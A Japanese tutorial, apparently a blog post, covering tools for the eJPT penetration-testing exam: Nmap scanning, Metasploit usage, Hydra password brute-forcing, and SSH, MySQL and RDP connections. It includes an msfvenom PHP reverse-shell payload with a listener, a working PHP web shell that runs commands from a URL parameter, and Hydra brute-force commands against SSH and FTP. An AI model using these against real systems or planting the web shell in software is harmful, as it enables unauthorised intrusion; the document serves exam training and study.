## Nmap

### Nmapってなに？
ネットワークスキャンツール。ターゲットのどのポートが
開いているか、何のサービスが動いているかを調べる。
また簡易的なスクリプトオプションをつけることで、特定の情報を調査することもできる。
![](https://storage.googleapis.com/zenn-user-upload/91b150f626da-20260402.png)
### eJPTでの使いどころ
試験開始直後、まず最初に使うツール。
ここで得た情報が全ての起点になる。
問題の3分の1はこのNmapで答えをひきだすことができる。かなり重点的に使えるようにしておくべき。
また、引き出した情報に関しての見方も頭に入れておくとよい。

実際に試験で使ったものに絞って重要度順に紹介していくよ。

## よく使うフラグ

| フラグ | 意味 |
|--------|------|
| `-sC` | デフォルトスクリプトを実行。サービスの詳細情報を取得 |
| `-sV` | サービスのバージョンを検出 |
| `-oN` | スキャン結果をファイルに保存 |
| `-p-` | 全ポート（1〜65535）をスキャン |
| `-T4` | スキャン速度を上げる |
| `-A` | OS検出・バージョン検出・スクリプト・tracerouteを一括実行 |

## 基本コマンド

まず最初に打つコマンドはこれ。
```bash
nmap -sC -sV  <ターゲットIP>
```

これ一発でポート・サービス・バージョンが全部取れる。
試験開始直後はまずこれを打って有名な脆弱性を持っているマシンがないか確認するのが基本となってくる。

## 全ポートスキャン

デフォルトは上位1000ポートしかスキャンしない。
怪しいと思ったら時間はかかるが全ポートを確認。
```bash
nmap -p- <ターゲットIP>
```

## スキャン結果の見方

以下は実際のスキャン結果の例。
```bash
PORT     STATE  SERVICE  VERSION
22/tcp   open   ssh      OpenSSH 7.4
80/tcp   open   http     Apache httpd 2.4.49
3306/tcp open   mysql    MySQL 5.7.32
8080/tcp closed http
```

- **PORT** : ポート番号とプロトコル
- **STATE** : `open`は開いている、`closed`は閉じている
- **SERVICE** : 動いているサービスの種類
- **VERSION** : サービスのバージョン（脆弱性調査に使う）

## 見るべきポイント

**openになっているポートを全部メモすること！**
それぞれのサービスとバージョンが攻撃の糸口になる。

例えばこの結果なら

- 22番が開いてる → SSHで侵入できるかもしれない
- 80番が開いてる → Webサーバーがある
- 3306番が開いてる → MySQLに直接アクセスできるかもしれない

**具体的なバージョンをしらべること！**
上の例を見てみると「Apache httpd 2.4.49」と出ていることが確認できるだろう。
これについて脆弱性があるかどうか覚えている必要はない。
ただ、細かいバージョンが出てきた時点で脆弱性があるかどうかをGoogleなりSearchsploitなりで検索してみよう。
一発で侵入できる解決法になるかもしれない。

## Metasploit

### Metasploitってなに？
ペネトレーションテストの定番フレームワークだ。
脆弱性の調査・攻撃・権限昇格まで一通りカバーしている。これを使っておけば最強。例えるならすごく便利な道具箱という感じ。
通販番組で、「焼くのも、蒸すのも、煮るのも、お皿にまでなってこれ一つでなんでもできます！」のようなたくさんの機能がついたお料理鍋を見たことがあるのではないだろうか。
イメージはそんな感じ。
![](https://storage.googleapis.com/zenn-user-upload/ba5f0214cd1d-20260402.png)
### 基本操作

| コマンド | 意味 |
|----------|------|
| `search <キーワード>` | モジュールを検索 |
| `use <モジュール名>` | モジュールを選択 |
| `show options` | 設定項目を確認 |
| `set <オプション> <値>` | オプションを設定 |
| `run` | 実行 |

### 覚えておいた方がいいテクニック集

#### リバースシェル
ファイルアップロードができる環境で有効だ。
msfvenomでペイロードを生成してターゲットに
アップロード、実行させて接続を取る。
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<自分のIP> LPORT=4444 -f raw > shell.php
```

#### multi/handler
リバースシェルの接続を待ち受けるモジュールである。
リバースシェルとセットで使う。
```bash
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <自分のIP>
set LPORT 4444
run
```

### Webシェル

ファイルアップロード機能があるサイトで有効なテクニックだ。

#### どういう仕組みか

お問い合わせフォームや画像アップロードなど、
ファイルをアップロードできる箇所にPHPファイルを置く。
そのファイルにブラウザからアクセスすることで
サーバー上でコマンドを実行できるようになる。

**攻撃者 → ターゲット**の向きで操作する。

#### シンプルなWebシェル
```php
<?php
// ブラウザから「cmd」という名前で送られてきた命令を受け取ります
if (isset($_GET['cmd'])) {
    // 受け取った命令を、サーバーのコンピュータに直接実行させます
    // その結果を画面に表示します
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

これをshell.phpとして保存してアップロードする。

ブラウザから以下のようにアクセスすればコマンドが実行できる。
```
http://<ターゲットIP>/uploads/shell.php?cmd=whoami
```

### リバースシェルとの違い

| | Webシェル | リバースシェル |
|---|---|---|
| 接続の向き | 攻撃者→ターゲット | ターゲット→攻撃者 |
| 操作方法 | ブラウザ | meterpreter |
| 待ち受け | 不要 | multi/handler必要 |

![](https://storage.googleapis.com/zenn-user-upload/fe7893b80af1-20260403.png)

#### portfwd
meterpreterセッションからポートを転送する。
ピボット時に使う。詳細はピボット章で解説する。

#### addroute
ピボット先ネットワークへの経路を追加する。
詳細はピボット章で解説する。

### Meterpreterってなに？
通常のシェルを取った後に使える**高機能なシェル**のこと。
ファイル操作・ネットワーク調査・ピボットなど通常のシェルではできない操作が可能になる。

通常シェル → Meterpreterへの昇格はこれ。
```bash
use post/multi/manage/shell_to_meterpreter
set SESSION <セッション番号>
run
```

portfwdやaddrouteはMeterpreterセッションでないと使えない。
ピボットをする際は必ずMeterpreterに昇格。しなくてもMeterpreterになっておくとメリットが多いのでできるだけ挑戦すること！


## Hydra

### Hydraってなに？
パスワードクラックツール。
ユーザー名とパスワードのリストを使って
ログインを総当たりで試みる。

### eJPTでの使いどころ
Nmapでポートとサービスを特定した後、ログインが必要なサービスに対して使う。
SSHやFTPのパスワードが割れるとそこから芋蔓式に侵入が広がるきっかけになるので積極的に使っていこう。

### よく使うコマンド

# SSHへの攻撃
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<IP>

# FTPへの攻撃  
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>

## 辞書の選び方

Hydraはパスワードリスト（辞書）の質が結果を左右することがある。
なのでまずは軽い辞書で試して無理そうだったら諦めずに大きな辞書をつかって総当たりしてみよう。

**まず軽い辞書。**
```bash
# ユーザー名がわからない場合
hydra -L /usr/share/wordlists/common_unix_users.txt -P /usr/share/wordlists/fasttrack.txt ssh://<IP>

# ユーザー名がわかっている場合
hydra -l admin -P /usr/share/wordlists/fasttrack.txt ssh://<IP>
```

ダメだったら大きめの辞書に切り替える。
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

**rockyou.txt**は巨大なので時間がかかる。
不安で貧乏ゆすりがはげしくなっても、コーヒーでもいれて待つのが良いだろう。

## SSH

ターゲットにSSHで接続するツールだ。foothold後によく使う。

### パスワード認証
```bash
ssh <ユーザー名>@<IP>
```

接続後にパスワードを求められるので入力する。

### 鍵認証（パスワードなし）

秘密鍵ファイルがある場合はこれだ。
```bash
ssh -i <鍵ファイル> <ユーザー名>@<IP>
```

### ポートが22番以外の場合

Nmapでポートを確認して、22番以外だった場合は`-p`で指定する。
```bash
ssh -p <ポート番号> <ユーザー名>@<IP>
```

### よくあるエラー

鍵ファイルの権限が広すぎると接続できない。
その場合はこれを打つべし。
```bash
chmod 600 <鍵ファイル>
```

## mysql

MySQLに接続してDB名やテーブルを確認する。
```bash
mysql -u  -p -h 
```

接続後の基本操作はこれだ。
```bash
show databases;
use ;
show tables;
```

## xfreerdp

WindowsのリモートデスクトップへGUIで接続するツールだ。
```bash
xfreerdp /u: /p: /v:
```


ハッキングのルートによっては別のツールが必要になるかもしれないが、すくなくとも使うことになるだろうツールを紹介した。
